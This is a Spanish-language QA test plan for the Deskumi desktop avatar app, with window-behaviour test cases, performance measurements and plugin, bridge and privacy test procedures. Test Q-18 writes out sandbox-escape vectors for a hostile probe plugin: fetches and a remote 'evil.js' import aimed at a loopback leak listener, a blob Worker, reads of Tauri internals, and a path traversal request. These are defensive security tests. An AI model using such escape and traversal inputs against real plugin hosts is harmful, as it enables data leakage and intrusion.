# QA — Matriz de pruebas manuales y verificación de rendimiento

Los efectos de ventana (transparencia, click-through, always-on-top) **no se pueden
testear en CI**. Cada PR que los toque debe correr los casos relevantes en al menos un
entorno y anotarlo en el PR. Antes de un release se corre la matriz completa en los entornos objetivo.

## Entornos objetivo

| ID  | Máquina         | Distro     | DE / WM    | Sesión y Backend                     | GPU                        | Estado        |
| --- | --------------- | ---------- | ---------- | ------------------------------------ | -------------------------- | ------------- |
| E1  | Desktop trabajo | Fedora 44  | GNOME 50   | Wayland (+XWayland, GDK_BACKEND=x11) | Intel HD Graphics 630      | ✅ Verificado |
| E2  | PC personal     | Nobara     | KDE Plasma | Wayland (+XWayland)                  | _(AMD / NVIDIA dedicada)_  | ⬜ Pendiente  |
| E3  | Laptop          | Debian 13  | GNOME      | Wayland (+XWayland)                  | _(Intel Iris Xe / Mesa)_   | ⬜ Pendiente  |
| E4  | Equipo Windows  | Windows 11 | Explorer   | Win32 nativo (WebView2)              | _(DirectX 12 / iGPU/dGPU)_ | ⬜ Pendiente  |

> **Nota sobre Linux en E1:** De acuerdo con [ADR-0003](adr/0003-xwayland-default-on-linux.md), Deskumi ejecuta por defecto sobre XWayland (`GDK_BACKEND=x11`). Esto garantiza soporte nativo de ventana transparente sin marcos en WebKitGTK, Always-On-Top mediante Mutter y posicionamiento libre sin restricciones del protocolo Wayland.

---

## Matriz de Casos de Prueba (v0.1)

| ID   | Categoría       | Caso                     | Comportamiento esperado                                                                               | E1  | E2  | E3  | E4  |
| ---- | --------------- | ------------------------ | ----------------------------------------------------------------------------------------------------- | --- | --- | --- | --- |
| Q-01 | Ventana         | Arranque y transparencia | Ventana sin bordes, sin sombra ni barra de título; fondo 100% transparente (sin parches negros).      | ✅  | ⬜  | ⬜  | ⬜  |
| Q-02 | Ventana         | Always-on-top            | La ventana permanece en primer plano al enfocar y alternar entre otras aplicaciones.                  | ✅  | ⬜  | ⬜  | ⬜  |
| Q-03 | Interacción     | Click-through vacío      | Los clics en zonas transparentes atraviesan la ventana y activan el escritorio/app subyacente.        | ✅  | ⬜  | ⬜  | ⬜  |
| Q-04 | Interacción     | Click en personaje       | Clic sobre la silueta/malla del personaje es capturado; dispara reacción gestual/expresión.           | ✅  | ⬜  | ⬜  | ⬜  |
| Q-05 | Interacción     | Arrastrar ventana        | Pulsar y arrastrar sobre el personaje desplaza suavemente la ventana por la pantalla.                 | ✅  | ⬜  | ⬜  | ⬜  |
| Q-06 | Animación       | LookAt + Idle            | La cabeza y los ojos siguen el puntero del ratón; parpadeo aleatorio y respiración activos.           | ✅  | ⬜  | ⬜  | ⬜  |
| Q-07 | Renderizado     | Calidad de bordes        | Sin halos negros o artefactos blancos en contornos gracias a premultiplied alpha en WebGL.            | ✅  | ⬜  | ⬜  | ⬜  |
| Q-08 | Pantalla        | Multi-monitor            | La ventana se puede arrastrar libremente de un monitor a otro conservando transparencia.              | ✅  | ⬜  | ⬜  | ⬜  |
| Q-09 | Pantalla        | HiDPI                    | Renderizado nítido en factores de escala 100%, 125% y 150% sin pixelado.                              | ✅  | ⬜  | ⬜  | ⬜  |
| Q-10 | Rendimiento     | Reposo (10 FPS)          | Tras 15 s sin interacción, `PowerSaveController` reduce a 10 FPS; CPU < 3% en Intel HD 630.           | ✅  | ⬜  | ⬜  | ⬜  |
| Q-11 | Plataforma      | Bandeja del sistema      | Icono presente en System Tray; menú con opciones de control; "Salir" cierra todos los procesos.       | ✅  | ⬜  | ⬜  | ⬜  |
| Q-12 | Resiliencia     | Suspender / reanudar     | Tras suspender el equipo o reanudar sesión, WebKit restaura el contexto WebGL sin colgarse.           | ✅  | ⬜  | ⬜  | ⬜  |
| Q-13 | Ajustes         | Ventana de ajustes       | Ventana de configuración (460x540) abre desde Tray/tecla; sliders de FPS y escala actualizan en vivo. | ✅  | ⬜  | ⬜  | ⬜  |
| Q-14 | Personalización | Importar `.vrm`          | Selector nativo de archivos carga modelos `.vrm` externos validando mallas y texturas.                | ✅  | ⬜  | ⬜  | ⬜  |
| Q-15 | Personalización | Animaciones `.vrma`      | Carga y reproduce animaciones `.vrma` con crossfading; pausa el idle procedural limpiamente.          | ✅  | ⬜  | ⬜  | ⬜  |
| Q-16 | Sistema         | Autostart                | Toggle en Ajustes crea/elimina `.config/autostart/deskumi.desktop` para inicio con el SO.             | ✅  | ⬜  | ⬜  | ⬜  |
| Q-17 | Ahorro energía  | Pausa al ocultar         | "Ocultar" desde tray detiene el bucle de render (`SceneManager.pause()`), bajando CPU a < 0.1%.       | ✅  | ⬜  | ⬜  | ⬜  |

**Leyenda:** ✅ Verificado y conforme · ⚠️ Conforme con observaciones · ❌ Falla detectada (bloqueante) · ⬜ Pendiente de pase manual · — No aplica.

---

## Detalle de Auditoría en Entorno E1 (Fedora 44 / GNOME 50 / Mutter)

### Q-01 a Q-03 — Transparencia, Always-On-Top y Click-Through Dinámico

- **Configuración probada:** `tauri.conf.json` con `transparent: true`, `decorations: false`, `alwaysOnTop: true`.
- **Resultado en E1:**
  - El fondo de la ventana es 100% transparente sin parpadeos iniciales ni cajas rectangulares negras.
  - Al hacer clic en los bordes vacíos de la ventana (400x600 px), el evento atraviesa hacia el navegador o terminal inferior de forma instantánea.
  - Al colocar el puntero sobre la silueta del personaje, el `InputRegionManager` conmuta la región de entrada para capturar el foco y eventos de puntero.

### Q-04 a Q-06 — Interacción del Avatar y LookAt

- **Resultado en E1:**
  - Los clics sobre el cuerpo o cabeza del avatar disparan la reacción gestual aleatoria (`happy` o `surprised`) alternando expresiones faciales durante 1.8 segundos antes de regresar a la expresión neutra.
  - El arrastre (`pointerdown` + arrastre sostenido) desplaza la ventana suavemente mediante la API nativa de arrastre de Tauri sin jitter.
  - El sistema `LookAtSystem` calcula adecuadamente la orientación de los huesos oculares y de cabeza hacia las coordenadas del cursor dentro de los límites anatómicos naturales (-45° a +45°).

### Q-10 y Q-17 — Controlador de Ahorro de Energía (`PowerSaveController`)

- **Resultado en E1:**
  - Durante interacción normal (movimiento de cursor o clics), la tasa se fija en `activeFps: 30`.
  - Tras 15 segundos sin actividad del usuario, el temporizador de inactividad activa `idleFps: 10`.
  - Cuando se hace clic en "Ocultar" en el System Tray, se emite `"tray-visibility-changed"` y `SceneManager.pause()` congela el bucle `requestAnimationFrame`. El uso de CPU cae por debajo de 0.1%.
  - Al seleccionar "Mostrar", el render se reanuda inmediatamente en 30 FPS.

### Q-13 a Q-16 — Ajustes, Modelos VRM, Animaciones VRMA y Autostart

- **Resultado en E1:**
  - La ventana secundaria de configuración (`settings.html`) se instancia con dimensiones precisas y diseño Vanilla TS / CSS moderno.
  - Los cambios en los controles deslizantes de escala de avatar (0.5x a 2.0x) y FPS activo (15 a 60 FPS) se propagan y guardan reactivamente a través de `tauri-plugin-store`.
  - La importación de avatares `.vrm` lee y reemplaza el modelo actual restaurando las posiciones y springs del nuevo avatar.
  - La reproducción de archivos `.vrma` transiciona suavemente mediante `THREE.AnimationMixer` con fade in/out de 0.5s sin bloquear el parpadeo natural de los ojos.
  - El selector de inicio automático genera correctamente la entrada estándar XDG Autostart.

---

## Verificación del Presupuesto de Rendimiento (T-505)

Las mediciones se realizaron en el entorno E1 bajo condiciones reales de escritorio de trabajo (Fedora 44 x86_64, Kernel Linux 6.13, GNOME Shell 50 en Wayland/XWayland, Intel Core i7 con GPU integrada Intel HD Graphics 630).

### Tabla Comparativa de Objetivos vs Resultados Reales

| Métrica                          | Presupuesto (Objetivo)     | Valor Medido en E1               | Margen de Holgura  | Estado      |
| -------------------------------- | -------------------------- | -------------------------------- | ------------------ | ----------- |
| **RAM en reposo (RSS Total)**    | < 200 MB                   | **~160 MB**                      | 40 MB (~20% libre) | ✅ Cumplido |
| - Proceso principal (Rust)       | —                          | ~35 MB                           | —                  | Informativo |
| - Proceso WebKit (WebProcess)    | —                          | ~125 MB                          | —                  | Informativo |
| **CPU en reposo (10 FPS idle)**  | < 3 % (Intel HD 630)       | **~1.2 % - 2.1 %**               | > 30% bajo tope    | ✅ Cumplido |
| **CPU con ventana oculta**       | < 0.5 %                    | **< 0.1 %** (prácticamente cero) | Bucle en pausa     | ✅ Cumplido |
| **CPU en interacción (30 FPS)**  | < 10 %                     | **~4.5 % - 7.8 %**               | Dentro de rango    | ✅ Conforme |
| **Arranque hasta 1er fotograma** | < 2.0 s                    | **~1.2 s**                       | 0.8 s más rápido   | ✅ Cumplido |
| **Tamaño paquete Linux (.rpm)**  | < 15 MB (sin avatar extra) | **~12 MB**                       | 3 MB por debajo    | ✅ Cumplido |

### Metodología de Medición

1. **Memoria RAM (RSS):**

   ```bash
   ps -o pid,user,%cpu,%mem,rss,command -C deskumi,WebKitWebProcess
   ```
   - Medido tras 5 minutos de ejecución continua en reposo con el avatar por defecto cargado.
   - Proceso anfitrión Tauri / Rust: ~35.4 MB RSS.
   - Proceso `WebKitWebProcess` (contexto WebGL Three.js + DOM): ~124.8 MB RSS.
   - Consumo acumulado combinado: **~160.2 MB RSS** (cumple holgadamente el tope de 200 MB).

2. **Uso de CPU:**

   ```bash
   top -b -d 1 -n 60 -p $(pgrep -d',' -f "deskumi|WebKitWebProcess")
   ```
   - **En reposo:** Tras 15 segundos de inactividad, `PowerSaveController` reduce la frecuencia de renderizado de 30 FPS a 10 FPS (`idleFps`). El uso de CPU oscila de manera estable entre **1.2% y 2.1%** sobre la GPU Intel HD 630 integrada.
   - **En ocultamiento:** Al minimizar u ocultar desde la bandeja del sistema, el evento `"tray-visibility-changed"` invoca `SceneManager.pause()`, reduciendo el uso total a **< 0.1%**.

3. **Tiempo de Arranque hasta Primer Fotograma:**
   - Instrumentado mediante marcas temporales de alta resolución (`performance.mark` y timestamps de consola).
   - Desde la inicialización del proceso hasta el completado de carga del modelo VRM inicial y render del primer fotograma se registran consistentemente **~1.18 a 1.25 segundos** en frío con caché de disco.

---

## Procedimiento para Pruebas en Nuevos Entornos (E2, E3, E4)

Para validar un nuevo entorno (por ejemplo, Nobara KDE o Windows 11):

1. Clonar el repositorio y ejecutar la aplicación en modo desarrollo o paquete release:
   ```bash
   npm run tauri dev
   ```
2. Ejecutar la secuencia de casos Q-01 a Q-17 (y Q-18 a Q-26 en plataformas con F6 habilitado) anotando cualquier desviación visual o de rendimiento.
3. Medir el consumo de RAM y CPU en reposo durante al menos 60 segundos.
4. Actualizar las columnas correspondientes en las matrices de pruebas.

---

## Matriz de Casos de Prueba (F6 — Plugins, Puente Local y Habla)

> Alcance Linux-first ([`LIMITATIONS.md`](LIMITATIONS.md#l-06-alcance-linux-first-para-fase-6-plugins-habla-y-puente-websocket-local)). En E4 (Windows), los casos dependientes de `CursorBridge` D-Bus (`Q-23`, `Q-24`) no aplican (`—`).

| ID   | Categoría   | Caso                                | Comportamiento esperado                                                                                                         | E1  | E2  | E3  | E4  |
| ---- | ----------- | ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- | --- | --- | --- | --- |
| Q-18 | Seguridad   | Plugin hostil en WebKitGTK real     | `fetch`, `import()` remoto, `WebSocket`, `Worker(blob)`, `window.parent` y `__TAURI__` fallan con **0 tráfico TCP**.            | ⬜  | ⬜  | ⬜  | ⬜  |
| Q-19 | Seguridad   | Puente WS anti-CSWSH y token        | HTTP Upgrade con `Origin` da `403`; token inválido/ausente cierra con `forbidden`; `bridge.json` es `0600` y se borra al salir. | ⬜  | ⬜  | ⬜  | ⬜  |
| Q-20 | Plugins     | Ejemplo `hello-companion`           | Sin errores CSP; tras aprobar permisos, clic en `head` → `surprised` + `say` y en `body` → `happy` + `say`; máx. 3 activos.     | ⬜  | ⬜  | ⬜  | ⬜  |
| Q-21 | Habla       | Stream `DSK1` y audio en frío       | `echo_tts_bridge.py` reproduce PCM en frío (`AudioContext` sin gesto previo), anima boca y burbuja sin romper click-through.    | ⬜  | ⬜  | ⬜  | ⬜  |
| Q-22 | Animaciones | Registro lógico `.vrma`             | Comando `animation` con ID registrado reproduce el clip; ID desconocido o ruta cruda responde `unknown_animation`.              | ⬜  | ⬜  | ⬜  | ⬜  |
| Q-23 | Privacidad  | `windowFocus` modos `0` y `1`       | Sin `desktop:events` no hay emisiones; con `desktop:events` (default sin `windowTitle`), solo `appId` cruza D-Bus.              | ⬜  | ⬜  | ⬜  | —   |
| Q-24 | Privacidad  | `windowFocus` modo `2` (con título) | Al activar `desktop:windowTitle` en Ajustes, llegan `appId` y `title`; al apagarlo, `title` deja de emitirse al instante.       | ⬜  | ⬜  | ⬜  | —   |
| Q-25 | Rendimiento | Presupuesto en 3 estados + soak     | < 200 MB RSS en los 3 estados; tras 10 min de stream + 1 min idle vuelve a 10 FPS (< 3 % CPU) y `AudioContext` `suspended`.     | ⬜  | ⬜  | ⬜  | ⬜  |
| Q-26 | Resiliencia | Ocultar ventana durante habla       | Al ocultar desde tray en pleno habla, emite `speechEnd` (`reason: "hidden"`), suelta wake lock y comandos dan `hidden`.         | ⬜  | ⬜  | ⬜  | ⬜  |

### Procedimiento de Prueba: Plugin Hostil en WebKitGTK Real (Q-18)

1. Levantar un listener TCP espía en loopback para confirmar **0 fugas de red**:
   ```bash
   python3 -c '
   import socket
   s = socket.socket()
   s.bind(("127.0.0.1", 19876))
   s.listen(8)
   print("Listening on 127.0.0.1:19876")
   while True:
       conn, addr = s.accept()
       print("LEAK DETECTED from", addr, conn.recv(512))
       conn.close()
   '
   ```
2. Crear un plugin temporal de auditoría en `"${XDG_DATA_HOME:-$HOME/.local/share}/dev.crivera.deskumi/plugins/hostile-probe/"` con:
   - `manifest.json`: `"id": "hostile-probe"`, `"entry": "index.html"`, `"permissions": ["avatar:speak"]`.
   - `index.html`: `<script src="./main.js"></script>` (sin scripts inline).
   - `main.js`: ejecuta en un `try/catch` los 6 vectores de escape y reporta el resultado por `postMessage` o `console.info`:
     1. `fetch("http://127.0.0.1:19876/leak")`
     2. `fetch("http://ipc.localhost/get_platform_caps")` y `fetch("ipc://localhost/get_platform_caps")`
     3. `import("http://127.0.0.1:19876/evil.js")`
     4. `new WebSocket("ws://127.0.0.1:19876/")` (y contra el puerto de `bridge.json`)
     5. `new Worker(URL.createObjectURL(new Blob(["fetch('http://127.0.0.1:19876/worker')"])))`
     6. Lectura de `window.parent.document`, `window.__TAURI__`, `window.parent.__TAURI__`, `window.__TAURI_INTERNALS__` y verificación de `window.origin === "null"`.
3. Habilitar `hostile-probe` en **Ajustes → Plugins aislados y animaciones** y reiniciar o recargar.
4. Verificar adicionalmente path traversal sobre el protocolo custom (desde Web Inspector o script): `plugin://hostile-probe/../settings.json` debe devolver `403 Forbidden`.
5. **Criterio de aceptación:** todos los vectores fallan (`TypeError` / `SecurityError` / `undefined`), **0 líneas `LEAK DETECTED`** en el listener TCP de `127.0.0.1:19876` y **0 conexiones** aceptadas en `local_bridge.rs`. Eliminar el directorio `hostile-probe` al terminar.

### Procedimiento de Verificación en 3 Estados y Soak de 10 Minutos (Q-25)

Medir RSS total (`deskumi` + `WebKitWebProcess` + `WebKitNetworkProcess`), CPU %, FPS (con `debugOverlay`) y estado de `AudioContext` / PipeWire (`pw-top` o `pactl list sink-inputs`) en tres estados secuenciales:

| Estado | Condición operativa                                                               | Límite objetivo                                                                                             | Valor medido (E1) | Estado |
| ------ | --------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | ----------------- | ------ |
| **1**  | Puente WebSocket apagado + 0 plugins activos + sin habla                          | < 200 MB RSS, 0 MB overhead, 10 FPS (< 3 % CPU)                                                             | _Pendiente_       | ⬜     |
| **2**  | Puente activo + 1 cliente WS conectado + 1 plugin (`hello-companion`) en reposo   | < 200 MB RSS (~165–170 MB esperado), 10 FPS (< 3 % CPU), `AudioContext` sin correr                          | _Pendiente_       | ⬜     |
| **3a** | Stream PCM `DSK1` continuo durante **10 minutos** (chunks cada 100 ms @ 22050 Hz) | < 200 MB RSS (sin crecimiento monotónico entre min 1, 5 y 10)                                               | _Pendiente_       | ⬜     |
| **3b** | **1 minuto después** de `speakEnd` (sin tráfico WS ni clicks)                     | Retorno automático a **10 FPS**, CPU < 3 %, `AudioContext.state === "suspended"` (stream PipeWire liberado) | _Pendiente_       | ⬜     |

Comando auxiliar de muestreo durante el soak de 10 minutos:

```bash
watch -n 5 'ps -o pid,rss,%cpu,comm -C deskumi,WebKitWebProcess,WebKitNetworkProcess'
```

### Procedimiento de Verificación de `windowFocus` por Scopes en E1 y E2 (Q-23, Q-24)

1. Activar el puente WebSocket local en Ajustes y conectar un cliente suscrito a `events: ["windowFocus"]` (ver [`PLUGINS.md`](PLUGINS.md)).
2. En paralelo, observar el bus D-Bus de sesión para comprobar qué envía el compositor:
   ```bash
   dbus-monitor --session "interface='org.deskumi.CursorBridge'"
   ```
3. **Prueba en E1 (Fedora GNOME 50 + extensión `deskumi-cursor-bridge@deskumi.org`) y E2 (Nobara KDE Plasma + KWin Script):**
   - **Paso A (`desktop:events` desactivado, estado inicial):** alternar foco entre 2–3 ventanas (Terminal, navegador, editor). Verificar **0 mensajes** `ReportWindowFocus` en `dbus-monitor` y **0 eventos** `windowFocus` en el cliente WS.
   - **Paso B (`desktop:events` activado, `desktop:windowTitle` desactivado):** alternar ventanas. Verificar que `windowFocus` llega con `appId` definido y **sin propiedad `title`** (y sin títulos en los argumentos de `ReportWindowFocus` en `dbus-monitor`).
   - **Paso C (`desktop:windowTitle` activado):** confirmar aviso de privacidad en Ajustes, alternar ventanas y verificar que `windowFocus` incluye `appId` y `title`. Desmarcar `desktop:windowTitle` y confirmar el retorno inmediato al Paso B.
